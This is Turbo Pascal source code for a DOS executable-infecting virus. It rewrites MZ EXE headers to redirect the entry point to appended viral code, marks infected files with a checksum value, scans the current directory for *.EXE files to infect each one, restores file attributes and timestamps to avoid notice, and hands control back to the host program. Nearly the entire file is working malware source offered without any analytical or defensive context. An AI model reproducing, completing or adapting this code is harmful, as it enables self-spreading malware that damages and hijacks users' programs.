program FuckYou;

{$A+,B-,D+,E-,F-,G+,I-,L+,N+,O-,P-,Q-,R-,S-,T-,V+,X+}
{$M 16384,0,655360}

{$DEFINE DEBUGxxxx}

uses dos;

{$I CSIPSSSP.INC}
{$I RELO.INC}
{$I CH.INC}
{$I CV.INC}

const
  myrelo_size = myrelo_num * 4;

  cs_size = 3000;

type
  texeheader = record
    mz,
    last512,
    num512,
    relnum,
    headersize,
    minmem,
    maxmem,
    ss,
    sp,
    checksum,
    ip,
    cs,
    relofs,
    ovrnum : Word;
  end;

procedure ViriiProc; far; external;
{$L VIRII.OBJ}

var
  f, t : file;
  r : searchrec;

procedure initfile;
  begin
    findfirst(filerec(f).name, anyfile, r);
    if doserror <> 0 then exit;
    if r.attr and directory <> 0 then exit;

    filemode := 0;
    reset(f,1);
    filemode := 2;
    if ioresult <> 0 then exit;

    assign(t, 'tempfile');
    rewrite(t,1);
    if ioresult <> 0 then exit;
  end;

procedure donefile;
  begin
    close(f);
    setfattr(f, archive);
    if doserror <> 0 then
    begin
      close(t);
      erase(t);
      exit;
    end;
    erase(f);

    setftime(t, r.time xor 1);
    close(t);
    rename(t, filerec(f).name);
    setfattr(t, r.attr);
  end;

procedure closeall;
  begin
    close(f);
    close(t);
    erase(t);
  end;

type
  trelo = record
    offs : word;
    segm : word;
  end;

  tdatastruc = record
    oldcs : word;
    oldip : word;
    oldss : word;
    oldsp : word;
    unused: array[1..8] of char;
  end;

const
  bufsize = 32768;

var
  h : texeheader;
  codesize : longint;
  relo : array[1..bufsize div sizeof(trelo)] of trelo;
  relbyte : array[1..bufsize] of byte absolute relo;
  i, relo_num, relo_size : word;
  d : tdatastruc;

  err_h, errH : integer;
  ch2 : array[1..ch_num] of byte;
  cv2 : array[1..cv_num] of byte;

procedure copybytes(l : longint);
  begin
    while l > 0 do
    begin
      if l > sizeof(relo) then i := sizeof(relo) else i := l;
      blockread(f, relo, i, relo_size);
      blockwrite(t, relo, i);
      l := l - i;
    end;
  end;

procedure infectfile;
  {$IFDEF DEBUG}
  var
    fff : file;
  {$ENDIF}
  begin
    initfile;

    blockread(f, h, sizeof(h));
    if h.relnum * 4 > sizeof(relo) then begin closeall; exit end;
    if filesize(f) <> longint(h.num512-1)*512+h.last512 then begin closeall; exit end;
    if h.checksum = $FFFF then begin closeall; exit end; { alredy? }

    codesize := (longint(h.num512 - 1) * 512 + h.last512 -
                h.headersize * 16 + 15) div 16;
    inc(codesize);

    seek(f, h.relofs);
    blockread(f, relo, h.relnum * 4, relo_size);
    relo_num := relo_size div 4;

    for i := 1 to relo_num do
      if longint(relo[i].segm) + relo[i].offs div 16 >= codesize then begin closeall; exit end;

    seek(f, h.headersize * 16);

    inc(h.relnum, myrelo_num);
    h.headersize := (sizeof(h) + relo_size + myrelo_size + 15) div 16;

    d.oldcs := h.cs;
    d.oldip := h.ip;
    d.oldss := h.ss;
    d.oldsp := h.sp;
    {d.unused:= '12345678';}

    h.cs := mycs + codesize;
    h.ip := myip;               { + 5: skip CALL FAR INITTURBO }
    h.ss := myss + codesize;
    h.sp := mysp;
    h.checksum := $FFFF;        { infected }

    h.num512  := (h.headersize*16 + codesize*16 + virsize) div 512 + 1;
    h.last512 := (h.headersize*16 + codesize*16 + virsize) mod 512;
    if h.last512 = 0 then dec(h.num512);

    h.relofs := sizeof(h);

    blockwrite(t, h, sizeof(h));
    blockwrite(t, relo, relo_size);

    move(myrelo, relo, myrelo_size);
    for i := 1 to myrelo_num do
      inc(relo[i].segm, codesize);

    blockwrite(t, relo, myrelo_size);
    seek(t, h.headersize * 16);

    copybytes(codesize * 16 - 16);
    blockwrite(t, d, sizeof(d));

    move(mem[CSeg:0], relo, virsize);
    for i := 1 to myrelo_num do
      dec(memw[seg(relo) + trelo(myrelo[i]).segm:
               ofs(relo) + trelo(myrelo[i]).offs], CSeg);

    {$IFDEF DEBUG}
    assign(fff, '__2');
    rewrite(fff,1);
    blockwrite(fff, relo, cs_size);
    close(fff);
    {$ENDIF}

    fillchar(ch2, sizeof(ch2), 0);
    for i := 1 to cs_size do
    begin
      inc(ch2[1+(i-1) div cv_num], relbyte[i]);
      inc(cv2[1+(i-1) mod cv_num], relbyte[i]);
    end;

    err_h := 0;
    for i := 1 to ch_num do
      if ch2[i] <> ch[i] then begin
        inc(err_h);
        errH := i;
      end;

    if err_h > 1 then
    begin
      {$IFDEF DEBUG}
      writeln('Packed file is corrupted (err_H=',err_H,')');
      {$ENDIF}
      Halt(1);
    end;

    if err_h = 1 then
    begin
      {$IFDEF DEBUG}
      writeln('File is reconstructed (err_H=1, errH=',errH,')');
      readln;
      {$ENDIF}
      fillchar(cv2, sizeof(cv2), 0);
      for i := 1 to cs_size do
        if 1+(i-1) div cv_num <> errH then
          inc(cv2[1+(i-1) mod cv_num], relbyte[i]);
      for i := 1 to cv_num do
        relbyte[(errH-1)*cv_num+i] := cv[i] - cv2[i];

      {$IFDEF DEBUG}
      assign(fff, '__3');
      rewrite(fff,1);
      blockwrite(fff, relo, cs_size);
      close(fff);
      {$ENDIF}

    end;

    for i := 1 to myrelo_num do
      inc(memw[seg(relo) + trelo(myrelo[i]).segm:
               ofs(relo) + trelo(myrelo[i]).offs], codesize);

    blockwrite(t, relo, virsize);

    donefile;
  end;

procedure infectdir;
  var
    r : searchrec;
  begin
    findfirst('*.EXE', anyfile, r);
    while doserror = 0 do
    begin

      assign(f, r.name);
      infectfile;

      findnext(r);
    end;
  end;

begin

  if paramstr(1) = '/z0mbie' then
  begin
    assign(f, paramstr(2));
    infectfile;
    writeln('infected.');
    halt;
  end;

  viriiproc;
  infectdir;

  swapvectors;
  asm
    mov     ah, 62h
    int     21h

    mov     ax, cs
    dec     ax
    mov     ds, ax

    mov     si, tdatastruc(ds:[0]).oldcs
    mov     di, tdatastruc(ds:[0]).oldip
    mov     cx, tdatastruc(ds:[0]).oldss
    mov     dx, tdatastruc(ds:[0]).oldsp

    mov     ds, bx
    mov     es, bx

    add     bx, 16
    add     si, bx
    add     cx, bx

    mov     ss, cx
    mov     sp, dx

    push    si
    push    di
    retf
  end;

end.
